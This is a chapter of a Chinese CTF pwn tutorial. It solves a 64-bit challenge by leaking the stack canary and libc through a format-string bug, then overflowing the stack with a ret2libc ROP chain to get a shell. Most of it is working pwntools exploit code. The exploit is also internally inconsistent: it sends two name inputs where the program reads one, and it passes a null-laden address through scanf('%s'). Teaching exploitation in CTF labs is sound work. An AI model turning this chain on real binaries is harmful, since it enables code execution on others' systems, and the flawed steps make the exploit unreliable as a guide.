# 第 34 章 真题实战（一）：栈与格式化字符串

> 这一章我们用一道综合题，把栈溢出、Canary 泄露、ret2libc 串起来。

---

## 34.1 题目描述

一个 64 位程序，开启了 Canary 和 NX，未开启 PIE（Partial RELRO）。程序逻辑：

```c
// 简化版
int main() {
    char name[32];
    char buf[64];
    
    printf("Enter your name: ");
    scanf("%s", name);
    printf("Hello, ");
    printf(name);              // 格式化字符串漏洞
    printf("\n");
    
    printf("Enter your message: ");
    read(0, buf, 200);         // 栈溢出
    
    return 0;
}
```

目标：拿到 shell。

---

## 34.2 分析

1. **格式化字符串漏洞**：`printf(name)` 可以泄露 Canary 和 libc 地址
2. **栈溢出**：`read(0, buf, 200)` 可以覆盖返回地址
3. **Canary**：需要先泄露才能绕过
4. **NX**：栈不可执行，需要 ret2libc

---

## 34.3 解题步骤

### 步骤一：泄露 Canary

先测格式化字符串的偏移量。输入 `%p` 序列，找到 Canary（特征：低字节为 0）：

```python
p.sendlineafter(b'name: ', b'%11$p')
p.recvuntil(b'Hello, ')
canary = int(p.recvline().strip(), 16)
```

### 步骤二：泄露 libc

用 `%s` 读 GOT 表：

```python
# 假设 name 缓冲区的偏移量是 6
payload = p64(elf.got['puts']) + b'%6$s'
p.sendlineafter(b'name: ', payload)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']
```

### 步骤三：栈溢出 + ret2libc

```python
offset_to_canary = 72     # buf 到 Canary 的偏移
offset_to_ret = 88        # buf 到返回地址的偏移

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = flat({
    offset_to_canary: p64(canary),
    offset_to_ret: [
        ret_gadget,           # 栈对齐
        pop_rdi, binsh,
        system
    ]
})
p.sendlineafter(b'message: ', payload)
p.interactive()
```

## 34.4 完整 exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(elf.path)

# 泄露 Canary
p.sendlineafter(b'name: ', b'%11$p')
p.recvuntil(b'Hello, ')
canary = int(p.recvline().strip(), 16)
log.success(f'Canary: {hex(canary)}')

# 泄露 libc
p.sendlineafter(b'name: ', p64(elf.got['puts']) + b'%6$s')
p.recvuntil(b'Hello, ')
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success(f'libc: {hex(libc.address)}')

# getshell
pop_rdi = 0x4012a3
ret = 0x40101a
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))

payload = flat({
    72: p64(canary),
    80: p64(0),
    88: [ret, pop_rdi, binsh, system]
})

p.sendlineafter(b'message: ', payload)
p.interactive()
```

## 34.5 小结

这道题综合了栈篇和格式化字符串篇的核心技术。关键点：

- 格式化字符串既是信息泄露工具，也是绕过 Canary 的钥匙
- 泄露 libc 后，ret2libc 是标准的 getshell 手法
